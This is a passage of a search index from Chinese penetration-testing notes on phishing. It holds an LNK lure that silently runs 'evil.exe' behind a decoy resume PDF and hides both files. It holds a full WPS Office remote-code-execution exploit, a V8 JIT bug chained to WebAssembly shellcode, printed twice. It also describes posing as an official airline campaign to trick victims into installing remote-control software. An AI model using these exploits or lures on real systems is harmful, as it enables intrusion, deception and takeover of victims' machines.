wps","title":"\u601d\u8def"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/","text":"lnk\u9493\u9c7c\u5b9e\u8df5 \u51c6\u5907\u4e00\u4e2a\u6b63\u5e38\u7684a.pdf\u548c\u6076\u610fexe b.exe\u548cpdf icon\u6587\u4ef6 \u76ee\u7684\uff1a\u5236\u4f5c\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u91cc\u53ea\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u5939\uff08\u7f13\u89e3\u53d7\u5bb3\u8005\u76f4\u63a5\u5728\u538b\u7f29\u5305\u91cc\u770b\u5230pdf\u7136\u540e\u70b9\u51fb\uff0c\u4e0d\u7ba1lnk\u6587\u4ef6\uff09 \u89e3\u538b\u540e\u53ea\u6709\u4e00\u4e2aico\u6587\u4ef6\uff08\u4f2a\u88c5\u6210\u5176\u5b83\uff09\u548c\u4e00\u4e2alnk\u6587\u4ef6\uff0c\u771f\u5b9e\u7684pdf\u548cexe\u8fdb\u884c\u9690\u85cf\u3002 \u70b9\u51fblnk\u4f1a\u6253\u5f00pdf\u5e76\u6253\u5f00exe\u3002 lnk\u5236\u4f5c\uff1a C:\\Windows\\System32\\cmd.exe /c start /b evil.exe & \u5f20\u5e7f\u5f6c-java\u5f00\u53d1\u5de5\u7a0b\u5e08.pdf \u6587\u4ef6\u9690\u85cf attrib +h +s .\\\u5f20\u5e7f\u5f6c-java\u5f00\u53d1\u5de5\u7a0b\u5e08.pdf attrib +h +s .\\evil.exe","title":"lnk\u9493\u9c7c\u5b9e\u8df5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/lnk%E9%92%93%E9%B1%BC%E5%AE%9E%E8%B7%B5/#lnk","text":"\u51c6\u5907\u4e00\u4e2a\u6b63\u5e38\u7684a.pdf\u548c\u6076\u610fexe b.exe\u548cpdf icon\u6587\u4ef6 \u76ee\u7684\uff1a\u5236\u4f5c\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u538b\u7f29\u5305\u91cc\u53ea\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u5939\uff08\u7f13\u89e3\u53d7\u5bb3\u8005\u76f4\u63a5\u5728\u538b\u7f29\u5305\u91cc\u770b\u5230pdf\u7136\u540e\u70b9\u51fb\uff0c\u4e0d\u7ba1lnk\u6587\u4ef6\uff09 \u89e3\u538b\u540e\u53ea\u6709\u4e00\u4e2aico\u6587\u4ef6\uff08\u4f2a\u88c5\u6210\u5176\u5b83\uff09\u548c\u4e00\u4e2alnk\u6587\u4ef6\uff0c\u771f\u5b9e\u7684pdf\u548cexe\u8fdb\u884c\u9690\u85cf\u3002 \u70b9\u51fblnk\u4f1a\u6253\u5f00pdf\u5e76\u6253\u5f00exe\u3002 lnk\u5236\u4f5c\uff1a C:\\Windows\\System32\\cmd.exe /c start /b evil.exe & \u5f20\u5e7f\u5f6c-java\u5f00\u53d1\u5de5\u7a0b\u5e08.pdf \u6587\u4ef6\u9690\u85cf attrib +h +s .\\\u5f20\u5e7f\u5f6c-java\u5f00\u53d1\u5de5\u7a0b\u5e08.pdf attrib +h +s .\\evil.exe","title":"lnk\u9493\u9c7c\u5b9e\u8df5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/wps/wps/","text":"wps \u91d1\u5c71WPS RCE wps\u5f71\u54cd\u8303\u56f4\u4e3a\uff1aWPS Office 2023 \u4e2a\u4eba\u7248 < 11.1.0.15120 WPS Office 2019 \u4f01\u4e1a\u7248 < 11.8.2.12085 POC \u57281.html\u5f53\u524d\u8def\u5f84\u4e0b\u542f\u52a8http server\u5e76\u76d1\u542c80\u7aef\u53e3\uff0c\u4fee\u6539hosts\u6587\u4ef6\uff08\u6d4b\u8bd5\u5199\u6b7b\u7684\uff09 127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn \u6f0f\u6d1e\u89e6\u53d1\u9700\u8ba9\u57df\u540d\u89c4\u5219\u6ee1\u8db3clientweb.docer.wps.cn .{xxxxx} wps.cn cloudwps.cn\u548cwps.cn\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb \u4ee3\u7801\u5757\u5728\u5e95\u4e0b\u3002\uff08\u9700\u8981\u539fpdf\u52a0wechat\uff09 \\ </p> <p>if(typeof alert === \"undefined\"){</p> <p>alert = console.log;</p> <p>}</p> <p>let f64 = new Float64Array(1);</p> <p>let u32 = new Uint32Array(f64.buffer);</p> <p>function d2u(v) {</p> <p>f64[0] = v;</p> <p>return u32;</p> <p>}</p> <p>function u2d(lo, hi) {</p> <p>u32[0] = lo;</p> <p>u32[1] = hi;</p> <p>return f64[0];</p> <p>}</p> <p>function gc(){ // major</p> <p>for (let i = 0; i &lt; 0x10; i++) {</p> <p>new Array(0x100000);</p> <p>}</p> <p>}</p> <p>function foo(bug) {</p> <p>function C(z) {</p> <p>Error.prepareStackTrace = function(t, B) {</p> <p>return B[z].getThis();</p> <p>};</p> <p>let p = Error().stack;</p> <p>Error.prepareStackTrace = null;</p> <p>return p;</p> <p>}</p> <p>function J() {}</p> <p>var optim = false;</p> <p>var opt = new Function(</p> <p>'a', 'b', 'c',</p> <p>'if(typeof a===\\'number\\'){if(a&gt;2){for(var</p> <p>i=0;i&lt;100;i++);return;}b.d(a,b,1);return}' +</p> <p>'g++;'.repeat(70));</p> <p>var e = null;</p> <p>J.prototype.d = new Function(</p> <p>'a', 'b', '\"use strict\";b.a.call(arguments,b);return arguments[a];');</p> <p>J.prototype.a = new Function('a', 'a.b(0,a)');</p> <p>J.prototype.b = new Function(</p> <p>'a', 'b',</p> <p>'b.c();if(a){' +</p> <p>'g++;'.repeat(70) + '}');</p> <p>J.prototype.c = function() {</p> <p>if (optim) {</p> <p>var z = C(3);</p> <p>var p = C(3);</p> <p>z[0] = 0;</p> <p>e = {M: z, C: p};</p> <p>}</p> <p>};</p> <p>var a = new J();</p> <p>// jit optim</p> <p>if (bug) {</p> <p>for (var V = 0; 1E4 &gt; V; V++) {</p> <p>opt(0 == V % 4 ? 1 : 4, a, 1);</p> <p>}</p> <p>}</p> <p>optim = true;</p> <p>opt(1, a, 1);</p> <p>return e;</p> <p>}</p> <p>e1 = foo(false);</p> <p>e2 = foo(true);</p> <p>delete e2.M[0];</p> <p>let hole = e2.C[0];</p> <p>let map = new Map();</p> <p>map.set('asd', 8);</p> <p>map.set(hole, 0x8);</p> <p>map.delete(hole);</p> <p>map.delete(hole);</p> <p>map.delete(\"asd\");</p> <p>map.set(0x20, \"aaaa\");</p> <p>let arr3 = new Array(0);</p> <p>let arr4 = new Array(0);</p> <p>let arr5 = new Array(1);</p> <p>let oob_array = [];</p> <p>oob_array.push(1.1);</p> <p>map.set(\"1\", -1);</p> <p>let obj_array = {</p> <p>m: 1337, target: gc</p> <p>};</p> <p>let ab = new ArrayBuffer(1337);</p> <p>let object_idx = undefined;</p> <p>let object_idx_flag = undefined;</p> <p>let max_size = 0x1000;</p> <p>for (let i = 0; i &lt; max_size; i++) {</p> <p>if (d2u(oob_array[i])[0] === 0xa72) {</p> <p>object_idx = i;</p> <p>object_idx_flag = 1;</p> <p>break;</p> <p>}if (d2u(oob_array[i])[1] === 0xa72) {</p> <p>object_idx = i + 1;</p> <p>object_idx_flag = 0;</p> <p>break;</p> <p>}</p> <p>}</p> <p>function addrof(obj_para) {</p> <p>obj_array.target = obj_para;</p> <p>let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;</p> <p>obj_array.target = gc;</p> <p>return addr;</p> <p>}</p> <p>function fakeobj(addr) {</p> <p>let r8 = d2u(oob_array[object_idx]);</p> <p>if (object_idx_flag === 0) {</p> <p>oob_array[object_idx] = u2d(addr, r8[1]);</p> <p>}else {</p> <p>oob_array[object_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>return obj_array.target;</p> <p>}</p> <p>let bk_idx = undefined;</p> <p>let bk_idx_flag = undefined;</p> <p>for (let i = 0; i &lt; max_size; i++) {</p> <p>if (d2u(oob_array[i])[0] === 1337) {</p> <p>bk_idx = i;</p> <p>bk_idx_flag = 1;</p> <p>break;</p> <p>}if (d2u(oob_array[i])[1] === 1337) {</p> <p>bk_idx = i + 1;</p> <p>bk_idx_flag = 0;</p> <p>break;</p> <p>}</p> <p>}</p> <p>let dv = new DataView(ab);</p> <p>function get_32(addr) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>let val = dv.getUint32(0, true);</p> <p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p> <p>return val;</p> <p>}</p> <p>function set_32(addr, val) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>dv.setUint32(0, val, true);</p> <p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p> <p>}</p> <p>function write8(addr, val) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>dv.setUint8(0, val);</p> <p>}</p> <p>let fake_length = get_32(addrof(oob_array)+12);</p> <p>set_32(get_32(addrof(oob_array)+8)+4,fake_length);</p> <p>let wasm_code = new</p> <p>Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,</p> <p>128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,</p> <p>128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0</p> <p>,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</p> <p>let wasm_mod = new WebAssembly.Module(wasm_code);</p> <p>let wasm_instance = new WebAssembly.Instance(wasm_mod);</p> <p>let f = wasm_instance.exports.main;</p> <p>let target_addr = addrof(wasm_instance)+0x40;</p> <p>let rwx_mem = get_32(target_addr);</p> <p>//alert(\"rwx_mem is\"+rwx_mem.toString(16));</p> <p>const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,</p> <p>0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,</p> <p>0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,</p> <p>0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,</p> <p>0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,</p> <p>0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</p> <p>0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,</p> <p>0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,</p> <p>0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,</p> <p>0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,</p> <p>0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,</p> <p>0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,</p> <p>0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,</p> <p>0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,</p> <p>0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,</p> <p>0x00]);</p> <p>for(let i=0;i\\&lt;shellcode.length;i++){</p> <p>write8(rwx_mem+i,shellcode[i]);</p> <p>}</p> <p>f();</p> <p>\\","title":"wps"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/wps/wps/#wps","text":"","title":"wps"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/wps/wps/#wps-rce","text":"wps\u5f71\u54cd\u8303\u56f4\u4e3a\uff1aWPS Office 2023 \u4e2a\u4eba\u7248 < 11.1.0.15120 WPS Office 2019 \u4f01\u4e1a\u7248 < 11.8.2.12085 POC \u57281.html\u5f53\u524d\u8def\u5f84\u4e0b\u542f\u52a8http server\u5e76\u76d1\u542c80\u7aef\u53e3\uff0c\u4fee\u6539hosts\u6587\u4ef6\uff08\u6d4b\u8bd5\u5199\u6b7b\u7684\uff09 127.0.0.1 clientweb.docer.wps.cn.cloudwps.cn \u6f0f\u6d1e\u89e6\u53d1\u9700\u8ba9\u57df\u540d\u89c4\u5219\u6ee1\u8db3clientweb.docer.wps.cn .{xxxxx} wps.cn cloudwps.cn\u548cwps.cn\u6ca1\u6709\u4efb\u4f55\u5173\u7cfb \u4ee3\u7801\u5757\u5728\u5e95\u4e0b\u3002\uff08\u9700\u8981\u539fpdf\u52a0wechat\uff09 \\ </p> <p>if(typeof alert === \"undefined\"){</p> <p>alert = console.log;</p> <p>}</p> <p>let f64 = new Float64Array(1);</p> <p>let u32 = new Uint32Array(f64.buffer);</p> <p>function d2u(v) {</p> <p>f64[0] = v;</p> <p>return u32;</p> <p>}</p> <p>function u2d(lo, hi) {</p> <p>u32[0] = lo;</p> <p>u32[1] = hi;</p> <p>return f64[0];</p> <p>}</p> <p>function gc(){ // major</p> <p>for (let i = 0; i &lt; 0x10; i++) {</p> <p>new Array(0x100000);</p> <p>}</p> <p>}</p> <p>function foo(bug) {</p> <p>function C(z) {</p> <p>Error.prepareStackTrace = function(t, B) {</p> <p>return B[z].getThis();</p> <p>};</p> <p>let p = Error().stack;</p> <p>Error.prepareStackTrace = null;</p> <p>return p;</p> <p>}</p> <p>function J() {}</p> <p>var optim = false;</p> <p>var opt = new Function(</p> <p>'a', 'b', 'c',</p> <p>'if(typeof a===\\'number\\'){if(a&gt;2){for(var</p> <p>i=0;i&lt;100;i++);return;}b.d(a,b,1);return}' +</p> <p>'g++;'.repeat(70));</p> <p>var e = null;</p> <p>J.prototype.d = new Function(</p> <p>'a', 'b', '\"use strict\";b.a.call(arguments,b);return arguments[a];');</p> <p>J.prototype.a = new Function('a', 'a.b(0,a)');</p> <p>J.prototype.b = new Function(</p> <p>'a', 'b',</p> <p>'b.c();if(a){' +</p> <p>'g++;'.repeat(70) + '}');</p> <p>J.prototype.c = function() {</p> <p>if (optim) {</p> <p>var z = C(3);</p> <p>var p = C(3);</p> <p>z[0] = 0;</p> <p>e = {M: z, C: p};</p> <p>}</p> <p>};</p> <p>var a = new J();</p> <p>// jit optim</p> <p>if (bug) {</p> <p>for (var V = 0; 1E4 &gt; V; V++) {</p> <p>opt(0 == V % 4 ? 1 : 4, a, 1);</p> <p>}</p> <p>}</p> <p>optim = true;</p> <p>opt(1, a, 1);</p> <p>return e;</p> <p>}</p> <p>e1 = foo(false);</p> <p>e2 = foo(true);</p> <p>delete e2.M[0];</p> <p>let hole = e2.C[0];</p> <p>let map = new Map();</p> <p>map.set('asd', 8);</p> <p>map.set(hole, 0x8);</p> <p>map.delete(hole);</p> <p>map.delete(hole);</p> <p>map.delete(\"asd\");</p> <p>map.set(0x20, \"aaaa\");</p> <p>let arr3 = new Array(0);</p> <p>let arr4 = new Array(0);</p> <p>let arr5 = new Array(1);</p> <p>let oob_array = [];</p> <p>oob_array.push(1.1);</p> <p>map.set(\"1\", -1);</p> <p>let obj_array = {</p> <p>m: 1337, target: gc</p> <p>};</p> <p>let ab = new ArrayBuffer(1337);</p> <p>let object_idx = undefined;</p> <p>let object_idx_flag = undefined;</p> <p>let max_size = 0x1000;</p> <p>for (let i = 0; i &lt; max_size; i++) {</p> <p>if (d2u(oob_array[i])[0] === 0xa72) {</p> <p>object_idx = i;</p> <p>object_idx_flag = 1;</p> <p>break;</p> <p>}if (d2u(oob_array[i])[1] === 0xa72) {</p> <p>object_idx = i + 1;</p> <p>object_idx_flag = 0;</p> <p>break;</p> <p>}</p> <p>}</p> <p>function addrof(obj_para) {</p> <p>obj_array.target = obj_para;</p> <p>let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1;</p> <p>obj_array.target = gc;</p> <p>return addr;</p> <p>}</p> <p>function fakeobj(addr) {</p> <p>let r8 = d2u(oob_array[object_idx]);</p> <p>if (object_idx_flag === 0) {</p> <p>oob_array[object_idx] = u2d(addr, r8[1]);</p> <p>}else {</p> <p>oob_array[object_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>return obj_array.target;</p> <p>}</p> <p>let bk_idx = undefined;</p> <p>let bk_idx_flag = undefined;</p> <p>for (let i = 0; i &lt; max_size; i++) {</p> <p>if (d2u(oob_array[i])[0] === 1337) {</p> <p>bk_idx = i;</p> <p>bk_idx_flag = 1;</p> <p>break;</p> <p>}if (d2u(oob_array[i])[1] === 1337) {</p> <p>bk_idx = i + 1;</p> <p>bk_idx_flag = 0;</p> <p>break;</p> <p>}</p> <p>}</p> <p>let dv = new DataView(ab);</p> <p>function get_32(addr) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>let val = dv.getUint32(0, true);</p> <p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p> <p>return val;</p> <p>}</p> <p>function set_32(addr, val) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>dv.setUint32(0, val, true);</p> <p>oob_array[bk_idx] = u2d(r8[0], r8[1]);</p> <p>}</p> <p>function write8(addr, val) {</p> <p>let r8 = d2u(oob_array[bk_idx]);</p> <p>if (bk_idx_flag === 0) {</p> <p>oob_array[bk_idx] = u2d(addr, r8[1]);</p> <p>} else {</p> <p>oob_array[bk_idx] = u2d(r8[0], addr);</p> <p>}</p> <p>dv.setUint8(0, val);</p> <p>}</p> <p>let fake_length = get_32(addrof(oob_array)+12);</p> <p>set_32(get_32(addrof(oob_array)+8)+4,fake_length);</p> <p>let wasm_code = new</p> <p>Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,</p> <p>128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,</p> <p>128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0</p> <p>,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</p> <p>let wasm_mod = new WebAssembly.Module(wasm_code);</p> <p>let wasm_instance = new WebAssembly.Instance(wasm_mod);</p> <p>let f = wasm_instance.exports.main;</p> <p>let target_addr = addrof(wasm_instance)+0x40;</p> <p>let rwx_mem = get_32(target_addr);</p> <p>//alert(\"rwx_mem is\"+rwx_mem.toString(16));</p> <p>const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89,</p> <p>0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14,</p> <p>0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c,</p> <p>0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b,</p> <p>0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01,</p> <p>0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,</p> <p>0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7,</p> <p>0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58,</p> <p>0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01,</p> <p>0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61,</p> <p>0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d,</p> <p>0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b,</p> <p>0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd,</p> <p>0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,</p> <p>0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63,</p> <p>0x00]);</p> <p>for(let i=0;i\\&lt;shellcode.length;i++){</p> <p>write8(rwx_mem+i,shellcode[i]);</p> <p>}</p> <p>f();</p> <p>\\","title":"\u91d1\u5c71WPS RCE"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/","text":"\u5229\u7528360\u5b89\u5168\u4e91 \u76ee\u5f55 \u6587\u6848\u5927\u7eb2 \u64cd\u4f5c https://admin.online.360.cn/ \u6ce8\u518c\u4e2a\u53f7\u8fdb\u53bb\uff0c\u7136\u540e\u586b\u56e2\u961f\u540d\u7684\u65f6\u5019\u586b\u7684\u5b98\u65b9\u4e00\u70b9\uff08\u6bd4\u5982\u4e2d\u56fd\u4e1c\u65b9\u822a\u7a7aHVV2023\u4e13\u9879\u884c\u52a8\uff09\u3002 \u7136\u540e\u6709\u4e2a\u4e0b\u8f7d\u9875\uff0c\u7528\u8fd9\u4e2a\u53bb\u9493\u9c7c\u3002 \u4e0b\u9762\u8865\u4e00\u4e9b\u9493\u9c7c\u7528\u7684\u56fe\uff1a \u6587\u6848\u5927\u7eb2 \u70b9\u51fb\u4e0b\u8f7d \u70b9\u51fb\u540c\u610f\u5e76\u5b89\u88c5\uff0c\u7b49\u5f85\u5b89\u88c5\u7ed3\u675f \u4e0b\u8f7d\u5b8c\u6210\u540e\u8f93\u5165pin\u7801\uff0c\u901a\u5e38\u60c5\u51b5\u4e0bpin\u7801\u56de\u81ea\u52a8\u586b\u5199\uff0c\u65e0\u9700\u8f93\u5165 \u7136\u540e\u53eb\u4ed6\u968f\u4fbf\u626b\u626b\u75c5\u6bd2\u5565\u7684\uff0c\u88c5\u7684\u6211\u4eec\u5f88\u6b63\u7ecf \u64cd\u4f5c \u4ed6\u4eec\u5b89\u88c5\u4e86\u5b89\u5168\u4e91\u5e76\u81ea\u52a8\u52a0\u5165\u7ec4\u7ec7\u540e\u5c31\u4f1a\u4e0a\u7ebf \u7f3a\u70b9\uff1a\u8981\u51b2VIP\uff081000\u5757\u4e00\u5e74\uff09\u624d\u80fd\u76f4\u63a5\u8fdc\u63a7\uff0c\u514d\u8d39\u7248\u7684\u8fdc\u63a7\u5f97\u53d7\u63a7\u7aef\u624b\u52a8\u70b9\u51fb\u63a5\u53d7\u624d\u884c\u3002 \u603b\u7ed3\uff1a\u88ab\u4eba\u66dd\u5149\u8fd9\u4e2a\u601d\u8def\u540e\uff0c\u5c31\u53d8\u6210\u4e86\u70c2\u4e2d\u4e4b\u70c2\u3002","title":"\u5229\u7528360\u5b89\u5168\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/#360","text":"","title":"\u5229\u7528360\u5b89\u5168\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/#_1","text":"\u6587\u6848\u5927\u7eb2 \u64cd\u4f5c https://admin.online.360.cn/ \u6ce8\u518c\u4e2a\u53f7\u8fdb\u53bb\uff0c\u7136\u540e\u586b\u56e2\u961f\u540d\u7684\u65f6\u5019\u586b\u7684\u5b98\u65b9\u4e00\u70b9\uff08\u6bd4\u5982\u4e2d\u56fd\u4e1c\u65b9\u822a\u7a7aHVV2023\u4e13\u9879\u884c\u52a8\uff09\u3002 \u7136\u540e\u6709\u4e2a\u4e0b\u8f7d\u9875\uff0c\u7528\u8fd9\u4e2a\u53bb\u9493\u9c7c\u3002 \u4e0b\u9762\u8865\u4e00\u4e9b\u9493\u9c7c\u7528\u7684\u56fe\uff1a","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/%E5%88%A9%E7%94%A8360%E5%AE%89%E5%85%A8%E4%BA%91/#_2","text":"\u70b9\u51fb\u4e0b\u8f7d \u70b9\u51fb\u540c\u610f\u5e76\u5b89\u88c5\uff0c\u7b49\u5f85\u5b89\u88c5\u7ed3\u675f \u4e0b\u8f7d\u5b8c\u6210\u540e\u8f93\u5165pin\u7801\uff0c\u901a\u5e38\u60c5\u51b5\u4e0bpin\u7801\u56de\u81ea\u52a8\u586b\u5199\uff0c\u65e0\u9700\u8f93\u5165 